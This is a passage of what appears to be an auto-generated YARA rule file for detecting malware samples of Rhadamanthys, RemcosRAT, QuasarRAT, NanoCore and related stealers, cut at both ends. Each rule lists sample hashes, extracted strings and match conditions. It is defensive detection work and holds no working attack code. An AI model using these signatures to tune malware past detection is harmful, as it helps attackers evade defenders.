      hash2 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '54.00'*/
      $x3 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '53.00'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '47.00'*/
      $x5 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x6 = " is currently not supported for use in system callbacksbufio.Scanner: SplitFunc returns negative advance countcasfrom_Gscanstatu" ascii /* score: '45.00'*/
      $x7 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x8 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '44.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x10 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '42.00'*/
      $x11 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '42.00'*/
      $x12 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '38.00'*/
      $x13 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x14 = "structure needs cleaningupdate during transitionzlib: invalid dictionary bytes failed with errno= to unused region of span291038" ascii /* score: '35.00'*/
      $x15 = " lockedg= lockedm= m->curg= marked   ms cpu,  not in [ runtime= s.limit= s.state= threads= unmarked wbuf1.n= wbuf2.n=(unknown), " ascii /* score: '32.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__d42595b695fc008ef2c56aabd8efd68e__19 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash3 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $x1 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $s2 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s4 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s5 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s6 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s7 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s8 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s11 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s12 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s13 = "r spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRunnable: blackening not enabledno go" ascii /* score: '19.00'*/
      $s14 = "internal/sync.runtime_SemacquireMutex" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__1895460fffad9475fda0c84755ecfee1_imphash__NanoCore_signature__1895460fffad9475fda0c84755ecfee1_imphash__20 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, NanoCore(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_2d487e83.exe, NanoCore(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_5210d712.exe, PhantomStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, RedLineStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "541705f1e268cdaac90869bb557cd7b15c29cf6c01ca2ac6fd17f5e3953d394e"
      hash2 = "2d487e83f730e2f03f5a39cdaf7959597abcb588533f883ae6b02eeeafe1fcf4"
      hash3 = "5210d712006b4a9f71bc3862c38d09dc2f65b27e35629e9e1192290db73be935"
      hash4 = "04e9c806798bd5a910463b0a0cd14f53a0438e56de0b818df3a92fd862364148"
      hash5 = "2145473be96f4b6b036d81832e28375d57ac92daf698ac879ec7321297885f72"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s10 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSLIST" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "0b768923437678ce375719e30b21693e" and ( 8 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__335c1198_RemcosRAT_signature__ba7336e6_21 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature)_335c1198.xlsx, RemcosRAT(signature)_ba7336e6.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "335c1198739b316112714ac01ce5e4fd62ab3323157f8a4b4fea3568a1d7639e"
      hash2 = "ba7336e6a3975db8ce0f808c30c5f896ee8fcb2578e060fe1523f4ce74e6abf6"
   strings:
      $s1 = "<ds:data<?xml version=\"1.0\" encoding=\"utf-8\"?><ct:contentTypeSchema ct:_=\"\" ma:_=\"\" ma:contentTypeName=\"Document\" ma:c" ascii /* score: '30.00'*/
      $s2 = "storeItem ds:itemID=\"{91D2B966-B335-4036-9199-8BC893ABB35D}\" xmlns:ds=\"http://schemas.openxmlformats.org/officeDocument/2006/" ascii /* score: '25.00'*/
      $s3 = "tomXml\"><ds:schemaRefs><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/contentType\"/><ds:schemaRef ds" ascii /* score: '22.00'*/
      $s4 = "62656C6F773A2D" ascii /* score: '17.00'*/ /* hex encoded string 'below:-' */
      $s5 = "624F365320" ascii /* score: '17.00'*/ /* hex encoded string 'bO6S ' */
      $s6 = "44656C69766572696474476C74793A2D20" ascii /* score: '17.00'*/ /* hex encoded string 'DeliveridtGlty:- ' */
      $s7 = "63267B65742F2C20" ascii /* score: '17.00'*/ /* hex encoded string 'c&{et/, ' */
      $s8 = "50616E2A6C" ascii /* score: '17.00'*/ /* hex encoded string 'Pan*l' */
      $s9 = "766570622B7474752D2C755D20" ascii /* score: '17.00'*/ /* hex encoded string 'vepb+ttu-,u] ' */
      $s10 = "682978714C20" ascii /* score: '17.00'*/ /* hex encoded string 'h)xqL ' */
      $s11 = "652D3C7472666F6C20" ascii /* score: '17.00'*/ /* hex encoded string 'e-<trfol ' */
      $s12 = "50652D7C2D" ascii /* score: '17.00'*/ /* hex encoded string 'Pe-|-' */
      $s13 = "4C322D2D594C4C" ascii /* score: '17.00'*/ /* hex encoded string 'L2--YLL' */
      $s14 = "6F7264657220" ascii /* score: '17.00'*/ /* hex encoded string 'order ' */
      $s15 = "4E616D653B2D" ascii /* score: '17.00'*/ /* hex encoded string 'Name;-' */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__dd5ab8b9fa764d7d2af9d7651496ee43_imphash__RemcosRAT_signature__dd5ab8b9fa764d7d2af9d7651496ee43_imphas_22 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_dd5ab8b9fa764d7d2af9d7651496ee43(imphash).exe, RemcosRAT(signature)_dd5ab8b9fa764d7d2af9d7651496ee43(imphash)_3f4faa7f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5a94af11fb9313d24532099bf575e5b9ab10d87be64343dfd123a2badedc117b"
      hash2 = "3f4faa7fd9d13b6ba31874cd9e9720f99b8639b0b7d5017fea15ec3d0da6c7e6"
   strings:
      $x1 = "Ping %s%Error: Could not initialize icmp.dll.(Pinging %s [%s] with %d bytes of data:" fullword wide /* score: '31.00'*/
      $s2 = "Invalid ownerE%d is an invalid PageIndex value.  PageIndex must be between 0 and %d=This control requires version 4.70 or greate" wide /* score: '29.00'*/
      $s3 = "Thread Error: %s (%d)\"Unable to find a Table of Contents" fullword wide /* score: '20.00'*/
      $s4 = "\\CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\shell\\Scan with NetView\\command" fullword ascii /* score: '19.00'*/
      $s5 = "actGridLinesExecute" fullword ascii /* score: '18.00'*/
      $s6 = "actFindExecute" fullword ascii /* score: '18.00'*/
      $s7 = "actRefreshExecute" fullword ascii /* score: '18.00'*/
      $s8 = "actMessageExecute" fullword ascii /* score: '18.00'*/
      $s9 = "actRowSelectExecute" fullword ascii /* score: '18.00'*/
      $s10 = "actSaveExecute" fullword ascii /* score: '18.00'*/
      $s11 = "actStatusBarExecute" fullword ascii /* score: '18.00'*/
      $s12 = "actResourceBarExecute" fullword ascii /* score: '18.00'*/
      $s13 = "actOpenExecute" fullword ascii /* score: '18.00'*/
      $s14 = "actHotTrackExecute" fullword ascii /* score: '18.00'*/
      $s15 = "actToolBarExecute" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "dd5ab8b9fa764d7d2af9d7651496ee43" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__434d5d47_RemcosRAT_signature__b1de3576_RemcosRAT_signature__b35e5e26_RemcosRAT_signature__d4dbe2ec_23 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_434d5d47.xls, RemcosRAT(signature)_b1de3576.xlsx, RemcosRAT(signature)_b35e5e26.xlsx, RemcosRAT(signature)_d4dbe2ec.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "434d5d4795bc3eaafd4349ddcce4ef78d299212cdc47e136f96d943ab4539dc3"
      hash2 = "b1de3576310181dbcc65b4f94db5dfd52d110c37262908365476370ce9dc211a"
      hash3 = "b35e5e26ee96199fad283665d2ddf499dd177cd3234747759189e6eb45b6da2c"
      hash4 = "d4dbe2ec6a0dd5c762a644f13368aa37a54766a324adeace66b07171ef151356"
   strings:
      $s1 = "kkkkkkkkkkk" fullword wide /* reversed goodware string 'kkkkkkkkkkk' */ /* score: '18.00'*/
      $s2 = "/Type /FontDescriptor " fullword ascii /* score: '14.00'*/
      $s3 = "Description: Description: cid:image001.png@01D28083.6FE64A00" fullword wide /* score: '13.00'*/
      $s4 = "    /Producer (Brother Scanner System Image Conversion)" fullword ascii /* score: '12.00'*/
      $s5 = "  /BitsPerComponent 8" fullword ascii /* score: '11.00'*/
      $s6 = "/FontDescriptor 57 0 R " fullword ascii /* score: '10.00'*/
      $s7 = "  /Filter /DCTDecode" fullword ascii /* score: '10.00'*/
      $s8 = "/FontDescriptor 72 0 R " fullword ascii /* score: '10.00'*/
      $s9 = "/FontDescriptor 67 0 R " fullword ascii /* score: '10.00'*/
      $s10 = "/FontDescriptor 52 0 R " fullword ascii /* score: '10.00'*/
      $s11 = "/Filter [ /FlateDecode ] " fullword ascii /* score: '10.00'*/
      $s12 = "/FontDescriptor 62 0 R " fullword ascii /* score: '10.00'*/
      $s13 = "/Contents [ 34 0 R ] " fullword ascii /* score: '9.00'*/
      $s14 = "/Contents [ 14 0 R ] " fullword ascii /* score: '9.00'*/
      $s15 = "/Contents [ 46 0 R ] " fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__04e680c3_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_24 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04e680c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "04e680c37b3e4dea85505d8b785912f9a9ad3c7bbfc440e1f1654fd06510bc3c"
      hash2 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash3 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash4 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash5 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $x1 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x2 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '44.00'*/
      $x3 = "costura.system.memory.dll.compressed|4.0.1.2|System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '44.00'*/
      $x4 = "costura.system.runtime.compilerservices.unsafe.dll.compressed|6.0.3.0|System.Runtime.CompilerServices.Unsafe, Version=6.0.3.0, C" ascii /* score: '44.00'*/
      $x5 = "costura.gma.system.mousekeyhook.dll.compressed|5.7.1.0|Gma.System.MouseKeyHook, Version=5.7.1.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x6 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '42.00'*/
      $x7 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '42.00'*/
      $x8 = "costura.system.memory.dll.compressed|4.0.1.2|System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '42.00'*/
      $x9 = "costura.gma.system.mousekeyhook.dll.compressed|5.7.1.0|Gma.System.MouseKeyHook, Version=5.7.1.0, Culture=neutral, PublicKeyToken" ascii /* score: '42.00'*/
      $x10 = "costura.sharpdx.dxgi.dll.compressed|4.2.0.0|SharpDX.DXGI, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35e5521f1|Shar" ascii /* score: '41.00'*/
      $x11 = "costura.aforge.dll.compressed|2.2.5.0|AForge, Version=2.2.5.0, Culture=neutral, PublicKeyToken=c1db6ff4eaa06aeb|AForge.dll|2DA9E" ascii /* score: '41.00'*/
      $x12 = "costura.naudio.core.dll.compressed|2.2.1.0|NAudio.Core, Version=2.2.1.0, Culture=neutral, PublicKeyToken=e279aa5131008a41|NAudio" ascii /* score: '41.00'*/
      $x13 = "costura.sharpdx.dll.compressed|4.2.0.0|SharpDX, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35e5521f1|SharpDX.dll|09" ascii /* score: '41.00'*/
      $x14 = "costura.sharpdx.direct3d11.dll.compressed|4.2.0.0|SharpDX.Direct3D11, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35" ascii /* score: '41.00'*/
      $x15 = "costura.naudio.winmm.dll.compressed|2.2.1.0|NAudio.WinMM, Version=2.2.1.0, Culture=neutral, PublicKeyToken=e279aa5131008a41|NAud" ascii /* score: '41.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5__25 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash3 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash4 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash5 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash6 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash7 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash8 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash9 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash10 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash11 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash12 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash13 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash14 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s6 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s12 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s13 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s14 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s15 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__b4aab49d_RemcosRAT_signature__bae91a31_26 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_b4aab49d.xlsx, RemcosRAT(signature)_bae91a31.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b4aab49d78d4cd4a75525ae6cd037366f881e88733051a494e778cff87fd496e"
      hash2 = "bae91a317418d4f007dc4cc456692f7340383a4c10c3ee351de2f7e1676eaf05"
   strings:
      $x1 = "<</Author(Administrator)/CreationDate(D:20160205164127Z)/Creator(PScript5.dll Version 5.2.2)/ModDate(D:20250905130018+05'30')/Pr" ascii /* score: '47.00'*/
      $s2 = "oducer(GPL Ghostscript 8.15)/Title(I:\\\\EZHIL\\\\MASTER 1000\\\\1701-1800\\\\2675 1740 - A - COPPER WIRE Model \\(1\\))>>" fullword ascii /* score: '29.00'*/
      $s3 = "<</Author(Administrator)/CreationDate(D:20160205164127Z)/Creator(PScript5.dll Version 5.2.2)/ModDate(D:20250905130018+05'30')/Pr" ascii /* score: '28.00'*/
      $s4 = "         <xmp:CreatorTool>PScript5.dll Version 5.2.2</xmp:CreatorTool>" fullword ascii /* score: '20.00'*/
      $s5 = "yyyyyz" fullword wide /* reversed goodware string 'zyyyyy' */ /* score: '18.00'*/
      $s6 = "               <rdf:li xml:lang=\"x-default\">I:\\EZHIL\\MASTER 1000\\1701-1800\\2675 1740 - A - COPPER WIRE Model (1)</rdf:li>" fullword ascii /* score: '13.00'*/
      $s7 = "-2]* #,##0.00_);_([$" fullword wide /* score: '13.00'*/ /* hex encoded string ' ' */
      $s8 = "-2]* \\(#,##0.00\\);_([$" fullword wide /* score: '13.00'*/ /* hex encoded string ' ' */
      $s9 = "40% - Accent6 2" fullword ascii /* score: '12.00'*/
      $s10 = "20% - Accent6 3" fullword wide /* score: '12.00'*/
      $s11 = "40% - Accent1 2" fullword ascii /* score: '12.00'*/
      $s12 = "20% - Accent4 2" fullword ascii /* score: '12.00'*/
      $s13 = "            xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"" fullword ascii /* score: '12.00'*/
      $s14 = "60% - Accent1 2" fullword wide /* score: '12.00'*/
      $s15 = "20% - Accent6 2" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__25b59cda_RemcosRAT_signature__8094ed89_27 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_25b59cda.xlsx, RemcosRAT(signature)_8094ed89.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "25b59cda4893aea607cbc3ab11a1d7b85a72f350c4d66bad81ccd8ab851bfcd9"
      hash2 = "8094ed89d3a8a75dc4894556a4547f15474293d540e82288528d138ca752bed3"
   strings:
      $s1 = "<ds:datastoreItem ds:itemID=\"{91D2B966-B335-4036-9199-8BC893ABB35D}\" xmlns:ds=\"http://schemas.openxmlformats.org/officeDocume" ascii /* score: '30.00'*/
      $s2 = "2006/customXml\"><ds:schemaRefs><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/contentType\"/><ds:sche" ascii /* score: '22.00'*/
      $s3 = "LSchema\"/><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/properties\"/><ds:schemaRef ds:uri=\"http://" ascii /* score: '20.00'*/
      $s4 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s5 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><LongProperties xmlns=\"http://schemas.microsoft.com/office/2006/metadata/longProperti" ascii /* score: '17.00'*/
      $s6 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><LongProperties xmlns=\"http://schemas.microsoft.com/office/2006/metadata/longProperti" ascii /* score: '17.00'*/
      $s7 = "<ds:datastoreItem ds:itemID=\"{7141DE0C-160A-4E97-B065-A6895C6DCEB2}\" xmlns:ds=\"http://schemas.openxmlformats.org/officeDocume" ascii /* score: '17.00'*/
      $s8 = "ef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/properties/metaAttributes\"/><ds:schemaRef ds:uri=\"http://www.w3." ascii /* score: '17.00'*/
      $s9 = "V 56 /Type /FontDescriptor /XHeight 464>>" fullword ascii /* score: '14.00'*/
      $s10 = "/Type /FontDescriptor /XHeight 453>>" fullword ascii /* score: '14.00'*/
      $s11 = "<</BaseFont /LNUHNF+SimSun /CIDSystemInfo 50 0 R /CIDToGIDMap /Identity /DW 1000 /FontDescriptor 25 0 R /Subtype /CIDFontType2 /" ascii /* score: '14.00'*/
      $s12 = "<</BaseFont /CSKSUK+Wingdings-Regular /CIDSystemInfo 50 0 R /CIDToGIDMap /Identity /DW 500 /FontDescriptor 48 0 R /Subtype /CIDF" ascii /* score: '14.00'*/
      $s13 = "<</BaseFont /LNUHNF+SimSun /CIDSystemInfo 50 0 R /CIDToGIDMap /Identity /DW 1000 /FontDescriptor 25 0 R /Subtype /CIDFontType2 /" ascii /* score: '14.00'*/
      $s14 = "/StemV 60 /Type /FontDescriptor /XHeight 468>>" fullword ascii /* score: '14.00'*/
      $s15 = "/StemV 56 /Type /FontDescriptor /XHeight 0>>" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__04e680c3_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_28 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04e680c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "04e680c37b3e4dea85505d8b785912f9a9ad3c7bbfc440e1f1654fd06510bc3c"
      hash2 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash3 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
